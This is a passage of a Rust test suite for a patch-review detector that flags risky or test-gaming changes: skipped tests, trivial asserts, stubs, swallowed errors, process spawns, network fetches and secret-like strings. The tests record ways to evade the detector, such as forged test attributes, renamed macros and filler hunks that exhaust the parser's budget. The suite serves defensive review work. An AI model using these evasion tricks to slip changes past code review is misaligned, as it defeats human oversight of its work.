            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,4 +1,4 @@\n #[cfg(test)] // */\n fn production() {\n-    safe();\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&forged),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]
        );
        // every line added and line 1 claimed, but the file is not new
        let inserted = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&inserted),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]
        );
        // a new file in two hunks: neither is the whole file
        let two = parse(
            "diff --git a/src/a.rs b/src/a.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n@@ -0,0 +5,1 @@\n+fn more() {}\n",
        );
        if let Ok(mut files) = two {
            let file = files.remove(0);
            assert!(
                found(&file).iter().any(|item| item.0 == S::PanicPathAdded),
                "a new file in two hunks was believed"
            );
        }
    }

    /// Review V3 round 4, VD3R4-M-1: inside another macro's body the parser names no
    /// construct, and a rule that reads one line cannot follow an assertion over three. The
    /// line that opens it says that it was not checked. Before, there was nothing.
    #[test]
    fn a_construct_opened_inside_a_macro_body_and_closed_on_another_line_is_unchecked() {
        type Item = (EvidenceSignal, Basis, u32);
        let forwarded = found(&new_file(
            "tests/m.rs",
            &[
                "macro_rules! outer {",
                "    ($($tt:tt)*) => { $($tt)* };",
                "}",
                "outer! {",
                "    assert!(",
                "        true",
                "    );",
                "}",
            ],
        ));
        assert_eq!(forwarded, [(S::SyntaxUnchecked, Basis::Lexical, 5)]);
        let attribute = found(&new_file(
            "tests/m.rs",
            &[
                "outer! {",
                "    #[cfg_attr(",
                "        miri,",
                "        ignore",
                "    )]",
                "    #[test]",
                "    fn a() {}",
                "}",
            ],
        ));
        assert_eq!(attribute, [(S::SyntaxUnchecked, Basis::Lexical, 2)]);
        // On one line the token rules read it, and there is nothing unchecked. So too for an
        // assertion over several lines that the parser reads itself, and for one that is not
        // an assertion at all.
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["outer! {", "    assert!(true);", "}"],
                &[(S::TrivialAssert, Basis::Lexical, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        true", "    );", "}"],
                &[(S::TrivialAssert, Basis::SyntaxFragment, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        b()", "    );", "}"],
                &[],
            ),
            (
                &["outer! {", "    my_assert!(", "        true", "    );", "}"],
                &[],
            ),
            (
                &[
                    "outer! {",
                    "    assert!(b(), \"{}\", c(",
                    "        d",
                    "    ));",
                    "}",
                ],
                &[(S::SyntaxUnchecked, Basis::Lexical, 2)],
            ),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&new_file("tests/m.rs", body)), *expected, "{body:?}");
        }
        assert!(opens_across_lines("    debug_assert_eq ! ( a,"));
        assert!(!opens_across_lines("    assert!(a(b), c);"));
        assert!(!opens_across_lines("    x.assert!(") && !opens_across_lines("    #[derive("));
    }

    /// The other half: in a new file, what is not that proof leaves the item standing, and a
    /// hunk from the middle of a file proves nothing whatever it shows.
    #[test]
    fn a_panic_path_under_anything_less_than_that_proof_stands() {
        let stands: &[(&[&str], u32)] = &[
            (&["#[test]", "fn a() {", "    f().unwrap();", "}"], 3),
            (
                &[
                    "#[tokio::test]",
                    "async fn a() {",
                    "    f().await.expect(\"x\");",
                    "}",
                ],
                3,
            ),
            // Vesper's reproductions: an attribute imported under a test framework's name, a
            // dependency renamed to a test framework's, and the same done to `test` itself
            (
                &[
                    "use tracing::instrument as rstest;",
                    "#[rstest]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "use some_macros::passthrough as test;",
                    "#[test]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            // an attribute macro before the cfg, or around the item, may drop the cfg
            (
                &[
                    "#[strip]",
                    "#[cfg(test)]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "#[strip]",
                    "mod outer {",
                    "    #[cfg(test)]",
                    "    pub fn production() {",
                    "        load().unwrap();",
                    "    }",
                    "}",
                ],
                5,
            ),
            // the function after the one under `cfg(test)` is not under it
            (
                &[
                    "#[cfg(test)]",
                    "fn helper() {}",
                    "fn real() {",
                    "    f().unwrap();",
                    "}",
                ],
                4,
            ),
        ];
        for (body, line) in stands {
            assert_eq!(
                found(&new_file("src/a.rs", body)),
                [(S::PanicPathAdded, Basis::SyntaxFragment, *line)],
                "{body:?}"
            );
        }
    }

    /// A hunk from the middle of a file proves nothing, whatever it shows: above it a comment
    /// can be open that ends on the attribute's own line, and then this function is in the
    /// program.
    #[test]
    fn a_hunk_from_the_middle_of_a_file_proves_no_test_code() {
        let middle = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -40,4 +40,5 @@\n  notes\n #[cfg(test)] // */\n pub fn production() {\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&middle),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 43)]
        );
        for body in [
            &[
                " #[cfg(test)]",
                " mod checks {",
                "+    fn helper() { f().unwrap(); }",
                " }",
            ][..],
            &[
                "+#[cfg(test)]",
                "+fn helper() {",
                "+    f().unwrap();",
                "+}",
            ][..],
        ] {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::SyntaxFragment)],
                "{body:?}"
            );
        }
        let unseen = found(&hunk_of("tests/a.rs", &["+    f().unwrap();"]));
        assert_eq!(unseen, [(S::PanicPathAdded, Basis::SyntaxFragment, 2)]);
    }

    /// Where the parser cannot read, the lower rung's answer stands with its own basis; where
    /// neither finds anything there is nothing.
    #[test]
    fn what_the_parser_cannot_read_keeps_the_lower_rungs_answer() {
        // inside a macro's body the parser reads nothing
        assert_eq!(
            found(&hunk_of("src/a.rs", &["+    outer! { x.unwrap(); }"])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // a hunk over the fragment budget is not parsed at all, and says so
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        assert_eq!(
            found(&hunk_of("src/a.rs", &[long.as_str()])),
            [
                (S::PanicPathAdded, Basis::Lexical, 2),
                (S::SyntaxUnchecked, Basis::Lexical, 2)
            ]
        );
        for line in [
            "+    x.unwrap_or(1);",
            "+    x.expect_err(\"e\");",
            "+    let s = \"a.unwrap()\"; // b.unwrap()",
            "+    unwrap(x);",
            "-    f().unwrap();",
        ] {
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), [], "{line}");
        }
        // another language has no grammar here and no such rule
        assert_eq!(found(&hunk_of("a.py", &["+x.unwrap()"])), []);
    }

    /// The parse changes nothing it has no construct for: the same items, in the same order.
    #[test]
    fn items_the_parser_has_no_view_on_keep_their_place() {
        let file = hunk_of(
            "src/a.rs",
            &[
                "+    let c = std::process::Command::new(\"x\");",
                "+    let v = unsafe { f() }.unwrap();",
                "+    todo!()",
            ],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 2),
                (S::UnsafeAdded, Basis::Lexical, 3),
                (S::PanicPathAdded, Basis::SyntaxFragment, 3),
                (S::StubAdded, Basis::SyntaxFragment, 4),
            ]
        );
    }

    /// These are read on added lines only: removing a skip or a stub is the repair.
    #[test]
    fn removing_a_skip_a_trivial_assert_or_a_stub_is_not_evidence() {
        for (path, line) in [
            ("tests/a.rs", "#[ignore]"),
            ("tests/a.rs", "    assert!(true);"),
            ("src/a.rs", "    todo!()"),
            ("test_a.py", "@pytest.mark.skip"),
            ("a.py", "    raise NotImplementedError"),
        ] {
            assert_eq!(signals(&removed(path, &[line])), [], "{path}: {line}");
        }
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
                ("test_skipped", 3),
                ("trivial_assert", 3),
                ("stub_added", 3),
                ("error_swallowed", 3),
                ("panic_path_added", 3),
                ("syntax_unchecked", 1),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
    /// Review V3 round 1, VD3-H-1: an attribute that only mentions `test` proves no test, so the
    /// panic path under it stands. Before, `#[cfg_attr(any(), test)]` on a production function
    /// made the item disappear.
    #[test]
    fn a_false_test_context_does_not_withdraw_a_panic_path() {
        let stands: &[&[&str]] = &[
            &[
                "+#[cfg_attr(any(), test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[cfg_attr(feature = \"x\", test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            // review V3 round 2, VD3R2-H-1: an unknown path that ends in `test`
            &[
                "+#[my_framework::test]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[my_attribute(test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[cfg(not(test))]",
                "+mod real {",
                "+    pub fn production() {",
                "+        load().unwrap();",
                "+    }",
                "+}",
            ],
            &[
                "+mod tests {",
                "+    pub fn production() {",
                "+        load().unwrap();",
                "+    }",
                "+}",
            ],
        ];
        for body in stands {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::SyntaxFragment)],
                "{body:?}"
            );
        }
        // what is proved is still withdrawn
        let real = found(&new_file(
            "src/a.rs",
            &["#[cfg(test)]", "fn a() {", "    load().unwrap();", "}"],
        ));
        assert_eq!(real, []);
    }

    /// Review V3 round 1, VD3-M-1: a change inside a construct that started on an unchanged
    /// line is a change to the construct, reported on the added line.
    #[test]
    fn an_added_line_inside_a_construct_that_spans_lines_is_evidence() {
        let assertion = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn checks() {",
                "     assert!(",
                "-        computes_answer()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(assertion, [(S::TrivialAssert, Basis::SyntaxFragment, 4)]);
        // Review V3 round 2, VD3R2-M-1: a construct that was already what it is now is not
        // added by a change to its message. Before, these three were reported.
        for (path, body) in [
            (
                "src/m.rs",
                &[" fn f() {", "     todo!(", "+        \"later\"", "     )"][..],
            ),
            (
                "src/m.rs",
                &[
                    " fn later() {",
                    "     todo!(",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     )",
                ][..],
            ),
            (
                "tests/m.rs",
                &[
                    " fn check() {",
                    "     assert!(",
                    "         true,",
                    "-        \"old message\"",
                    "+        \"new message\"",
                    "     );",
                ][..],
            ),
        ] {
            assert_eq!(found(&hunk_of(path, body)), [], "{body:?}");
        }
        // a stub that replaces what was there is added, on the added line
        let stub = found(&hunk_of(
            "src/m.rs",
            &[
                " fn f() -> u8 {",
                "     compute(",
                "-        1",
                "+        todo!()",
                "     )",
            ],
        ));
        assert_eq!(stub, [(S::StubAdded, Basis::SyntaxFragment, 4)]);
        // an unchanged construct beside an added line is still not evidence
        let beside = found(&hunk_of(
            "tests/m.rs",
            &[" fn checks() {", "     assert!(true);", "+    let a = 1;"],
        ));
        assert_eq!(beside, []);
        // a `catch` whose empty block is on the next line
        let catch = found(&hunk_of(
            "web/a.ts",
            &[
                " try { work(); }",
                "-catch (e) { report(e); }",
                "+catch",
                "+{ }",
            ],
        ));
        assert_eq!(catch, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        let bound = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{}"],
        ));
        assert_eq!(bound, [(S::ErrorSwallowed, Basis::Hunk, 3)]);
        // a block with something in it is not
        let handled = found(&hunk_of(
            "web/a.ts",
            &[" try { work(); }", "+catch (e)", "+{ report(e); }"],
        ));
        assert_eq!(handled, []);
    }

    /// Review V3 round 1, VD3-L-1: more spellings of the same things.
    #[test]
    fn other_spellings_of_a_skip_a_swallowed_rejection_and_a_panic_path_are_evidence() {
        let lexical = |signal| vec![(signal, Basis::Lexical, 2)];
        assert_eq!(
            found(&hunk_of(
                "web/a.test.ts",
                &["+test.skipIf(isCI)(\"adds\", () => {});"]
            )),
            lexical(S::TestSkipped)
        );
        for line in [
            "+let v = Result::unwrap(read());",
            "+let v = Option::expect(first(), \"one\");",
        ] {
            assert_eq!(
                found(&hunk_of("src/u.rs", &[line])),
                lexical(S::PanicPathAdded),
                "{line}"
            );
        }
        for line in [
            "+run().catch(() => {});",
            "+p.catch(()=>{});",
            "+p.catch(e => {});",
            "+p.catch((e) => { });",
            "+p.catch(async (e) => {});",
            "+p.catch(function () {});",
            "+p.catch(function(e) { });",
            // review V3 round 2, VD3R2-L-1: a default value that calls a function
            "+run().catch((error = fallback()) => {});",
            "+run().catch(function (error = fallback()) {});",
            "+run().catch(async (error = fallback(a, (b))) => {});",
            "+run().catch(function onError(error) {});",
        ] {
            assert_eq!(
                found(&hunk_of("web/p.ts", &[line])),
                [(S::ErrorSwallowed, Basis::Hunk, 2)],
                "{line}"
            );
        }
        // a handler that does something, a named handler, and other calls named catch are not
        for line in [
            "+p.catch((e) => { report(e); });",
            "+p.catch(report);",
            "+p.catch(() => report());",
            "+p.catch(() => ({}));",
            "+cache.catchUp(() => {});",
            "+p.catch();",
            "+p.catch((error = fallback() => {});",
            "+p.catch((error = fallback()) => { report(error); });",
        ] {
            assert_eq!(found(&hunk_of("web/p.ts", &[line])), [], "{line}");
        }
        // a conditional skip is still reported: under some configuration the test does not run
        assert_eq!(
            found(&hunk_of(
                "tests/t.rs",
                &["+#[cfg_attr(miri, ignore)]", "+#[test]", "+fn a() {}"]
            ))
            .iter()
            .map(|i| i.0)
            .collect::<Vec<_>>(),
            [S::TestSkipped]
        );
    }
    /// Review V3 round 2, VD3R2-H-2: the parser reads at most a budget of hunk bytes per review,
    /// in the review's order, and what lies beyond keeps the token rules' answer.
    #[test]
    fn the_parser_reads_a_review_only_up_to_its_budget() {
        // each hunk: one added line of about 60 KB, then an added panic path
        let filler = format!("+    let x = {};", "1 + ".repeat(15_000) + "1");
        let files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler, "+    y.unwrap();"]))
            .collect();
        let plan = FragmentPlan::of(&files);
        let parsed = (0..files.len()).filter(|n| plan.allows(*n, 0)).count();
        let cost = filler.len() + "+    y.unwrap();".len() + 2 + 2 * " x\n".len();
        assert_eq!(parsed, REVIEW_FRAGMENT_BUDGET / cost, "cost {cost}");
        assert!(parsed > 10 && parsed < files.len(), "{parsed}");
        // the allowed hunks are the first ones, and an index the plan lacks is not parsed
        assert!((0..parsed).all(|n| plan.allows(n, 0)));
        assert!((parsed..files.len()).all(|n| !plan.allows(n, 0)));
        assert!(!plan.allows(0, 1) && !plan.allows(files.len(), 0));
        assert_eq!(plan.file(files.len()), &[] as &[bool]);
        // inside the budget the parser confirms the item; beyond it the spelling stands
        let basis = |n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis))
                .collect::<Vec<_>>()
        };
        assert_eq!(basis(0), [(S::PanicPathAdded, Basis::SyntaxFragment)]);
        assert_eq!(
            basis(files.len() - 1),
            [
                (S::PanicPathAdded, Basis::Lexical),
                (S::SyntaxUnchecked, Basis::Lexical)
            ]
        );
        // a file planned on its own is inside its own budget
        assert_eq!(
            file_evidence(&files[files.len() - 1])[0].basis,
            Basis::SyntaxFragment
        );
        // only Rust hunks with an added line that holds a word the parser reads cost anything
        let other = [
            hunk_of("a.py", &[&filler]),
            hunk_of("src/removed.rs", &["-    y.unwrap();"]),
            hunk_of("src/plain.rs", &[&filler]),
        ];
        let plan = FragmentPlan::of(&other);
        assert!((0..other.len()).all(|n| !plan.allows(n, 0)));
        assert!(other.iter().all(|file| found(file).is_empty()));
        // a word on an unchanged line counts: a construct can open there and reach an added line
        let context = [hunk_of(
            "src/context.rs",
            &["     assert!(", "+        true", "     );"],
        )];
        assert!(FragmentPlan::of(&context).allows(0, 0));
    }

    /// A hunk with very many items is read in one pass. The parser's answer used to be merged
    /// by searching the items for each construct and then sorting them with a key that searched
    /// the hunk: a hunk of 300,000 such lines did not finish in 30 seconds. With that code this
    /// test does not finish either.
    #[test]
    fn a_hunk_with_very_many_items_is_read_in_one_pass() {
        const LINES: usize = 150_000;
        // not parsed (over the fragment budget): every line is an item, and the hunk says once
        // that the parser did not read it
        let added = vec!["+    y.unwrap();"; LINES];
        let matches = |file: &ReviewFile| {
            let kind = FileKind::of(file);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            hunk_matches(
                &file.patch_twin.hunks[0],
                kind.language,
                &rules,
                true,
                false,
            )
        };
        let items = matches(&hunk_of("src/a.rs", &added));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(
            &items[..3],
            [
                (Side::New, S::PanicPathAdded, 2, Basis::Lexical),
                (Side::New, S::SyntaxUnchecked, 2, Basis::Lexical),
                (Side::New, S::PanicPathAdded, 3, Basis::Lexical),
            ]
        );
        assert!(items.windows(2).all(|pair| pair[0].2 <= pair[1].2));
        // parsed (the new side is small), with as many items on the old side
        let mut removed = vec!["-#[test]"; LINES];
        removed.push("+    y.unwrap();");
        let items = matches(&hunk_of("tests/a.rs", &removed));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(items[0], (Side::Old, S::TestRemoved, 2, Basis::Lexical));
        assert_eq!(
            items[LINES],
            (Side::New, S::PanicPathAdded, 2, Basis::SyntaxFragment)
        );
    }

    /// Review V3 round 3, VD3R3-M-1: the old side is compared construct by construct, by line
    /// and column, and an old side that cannot be read suppresses nothing. Before, another
    /// trivial assertion on the same line, or an old side over the fragment budget, hid an
    /// assertion that the change made trivial.
    #[test]
    fn the_old_side_hides_only_the_same_construct_and_only_when_it_is_read() {
        let same_row = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true); assert!(",
                "-        computes()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(same_row, [(S::TrivialAssert, Basis::SyntaxFragment, 4)]);
        // the first of the two already was trivial and only its message changes: still nothing
        let first = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true,",
                "-        \"old\"",
                "+        \"new\"",
                "     ); assert!(computes());",
            ],
        ));
        assert_eq!(first, []);
        let long = format!("-        {}", "1 + ".repeat(17_000) + "1 > 0");
        let unreadable = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(",
                long.as_str(),
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(unreadable, [(S::TrivialAssert, Basis::SyntaxFragment, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2. Whoever orders the hunks of a review must not be able to
    /// switch the parser off for a later one without a trace. Hunks with nothing for the parser
    /// cost nothing, so harmless filler spends no budget; and when the budget is spent on hunks
    /// that do hold its words, a later hunk whose construct only the parser finds says that it
    /// was not checked. Before, that hunk gave no evidence at all.
    #[test]
    fn a_hunk_the_parser_did_not_read_says_so() {
        // only the parser finds this one: the assertion is over three lines
        let hidden: &[&str] = &["+    assert!(", "+        true", "+    );"];
        let filler = format!("+    let x = {};", "1 + ".repeat(15_000) + "1");
        // Vesper's reproduction: 40 harmless hunks of about 60 KB, then the construct
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler]))
            .collect();
        files.push(hunk_of("tests/last.rs", hidden));
        let plan = FragmentPlan::of(&files);
        let last = files.len() - 1;
        assert!(plan.allows(last, 0), "harmless hunks spent the budget");
        let items = |plan: &FragmentPlan, n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            items(&plan, last),
            [(S::TrivialAssert, Basis::SyntaxFragment, 2)]
        );
        // the same with filler that does hold a word the parser reads
        let costly = format!("{filler} // unwrap");
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&costly]))
            .collect();
        // (a hunk as large as the others: a small one would still fit what is left)
        files.push(hunk_of(
            "tests/last.rs",
            &[&filler, "+    assert!(", "+        true", "+    );"],
        ));
        let plan = FragmentPlan::of(&files);
        assert!(!plan.allows(last, 0));
        let items = |n: usize| {
            file_evidence_in(&files[n], plan.file(n))
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect::<Vec<_>>()
        };
        assert_eq!(items(last), [(S::SyntaxUnchecked, Basis::Lexical, 3)]);
        // a hunk the parser read gives no such item, and neither does one in another language
        assert_eq!(items(0), []);
        assert_eq!(found(&hunk_of("a.py", &["+x = 1  # unwrap"])), []);
        // the item is on the first added line that holds one of the words
        let later = hunk_of(
            "src/big.rs",
            &[
                "+    let a = 1;",
                &format!("+    let b = {};", "1 + ".repeat(17_000) + "1"),
                "+    todo ! ( );",
            ],
        );
        assert_eq!(
            found(&later),
            [
                (S::StubAdded, Basis::Lexical, 4),
                (S::SyntaxUnchecked, Basis::Lexical, 4)
            ]
        );
    }

    /// Review V3 round 3, VD3R3-H-2: spellings the parser reads are found by the token rules
    /// too, whatever their spacing, so that switching the parser off loses as little as can be.
    #[test]
    fn spaced_spellings_are_found_without_the_parser() {
        // each line is made too long for the parser by a comment, so only token rules read it
        let pad = "a".repeat(70_000);
        for (line, signal) in [
            ("value.unwrap ();", S::PanicPathAdded),
            ("value . expect (\"set\");", S::PanicPathAdded),
            ("assert!( true );", S::TrivialAssert),
            ("assert ! (true , \"always\");", S::TrivialAssert),
            ("debug_assert!( true );", S::TrivialAssert),
            ("assert_eq!( true , true );", S::TrivialAssert),
            ("todo ! ();", S::StubAdded),
            ("unimplemented !( \"later\" )", S::StubAdded),
            ("# [ ignore ]", S::TestSkipped),
            ("#[ignore = \"slow\"]", S::TestSkipped),
            ("#[ cfg_attr( miri , ignore ) ]", S::TestSkipped),
        ] {
            let text = format!("+    {line} // {pad}");
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[text.as_str()])),
                [
                    (signal, Basis::Lexical, 2),
                    (S::SyntaxUnchecked, Basis::Lexical, 2)
                ],
                "{line}"
            );
        }
        for line in [
            "my_assert!( true );",
            "x.assert!(true);",
            "assert!( true_enough() );",
            "assert!( true == x );",
            "retodo ! ();",
            "x.unwrap_or ();",
            "unwrap ();",
            "#[cfg_attr(miri, allow(ignore_me))]",
        ] {
            let text = format!("+    {line} // {pad}");
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[text.as_str()])),
                [(S::SyntaxUnchecked, Basis::Lexical, 2)],
                "{line}"
            );
        }
        assert!(trivial_assert_rust("assert\t! ( true )"));
        assert!(trivial_assert_rust("debug_assert_eq ! (true,true , \"m\")"));
        // the word itself is not split, a cut argument list does not match, and neither does
        // another macro that only begins or ends the same way
        for line in [
            "ass ert!(true)",
            "assert!(tru",
            "assert!(true",
            "assert_ne!(true, true)",
            "assert_eq!(true)",
            "assert!(true, true_enough)",
        ] {
            let trivial = line.starts_with("assert!(true, ");
            assert_eq!(trivial_assert_rust(line), trivial, "{line}");
        }
        assert!(ignore_rust("#[ignore]") && ignore_rust("# [ ignore = \"slow\" ]"));
        assert!(ignore_rust("#[cfg_attr(miri, ignore = \"slow\")]"));
        assert!(!ignore_rust("#[ignored]") && !ignore_rust("x#[ignore]"));
        assert!(!ignore_rust("#[cfg_attr(miri, ignored)]") && !ignore_rust("[ignore]"));
        assert!(!spaced("", &["todo"], &["!("]) && !spaced("todo!(", &[], &["!("]));
        assert_eq!(follows(b"", b""), Some(0));
        assert_eq!(
            (follows(b"  ", b"!"), follows(b" ! (", b"!(")),
            (None, Some(4))
        );
    }

    /// A hunk over the fragment budget is turned away before anything is built from it.
    #[test]
    fn a_hunk_over_the_fragment_budget_costs_nothing_and_keeps_the_spelling() {
        let braces = format!(
            "+{}",
            "}".repeat(deep_diff_forge_syntax::FRAGMENT_BYTE_BUDGET)
        );
        let file = hunk_of("src/big.rs", &[&braces, "+    y.unwrap();"]);
        assert_eq!(fragment_cost(&file.patch_twin.hunks[0]), None);
        assert!(!FragmentPlan::of(std::slice::from_ref(&file)).allows(0, 0));
        assert_eq!(
            found(&file),
            [
                (S::PanicPathAdded, Basis::Lexical, 3),
                (S::SyntaxUnchecked, Basis::Lexical, 3)
            ]
        );
    }
}
